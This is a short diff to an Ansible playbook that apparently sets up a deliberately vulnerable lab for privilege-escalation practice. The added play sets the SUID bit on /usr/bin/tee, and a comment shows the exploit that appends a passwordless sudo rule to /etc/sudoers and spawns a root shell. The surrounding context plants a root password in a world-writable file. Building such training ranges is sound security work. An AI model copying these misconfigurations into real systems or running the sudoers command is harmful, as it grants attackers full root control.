@@ -261,3 +261,12 @@
         mode: '0666'
         content: |
           Now that the root admin is on vacation, I have to take over their tasks. The login password for root is aim8Du7h.
+
+- name: suid allow access to write privileges
+  hosts: vuln_suid_write_privileges
+  gather_facts: true
+  remote_user: root
+  tasks:
+    - name: set the suid bit for tee
+      command: chmod u+s /usr/bin/tee
+      # echo "lowpriv ALL=(ALL) NOPASSWD: ALL" | tee -a /etc/sudoers; sudo su
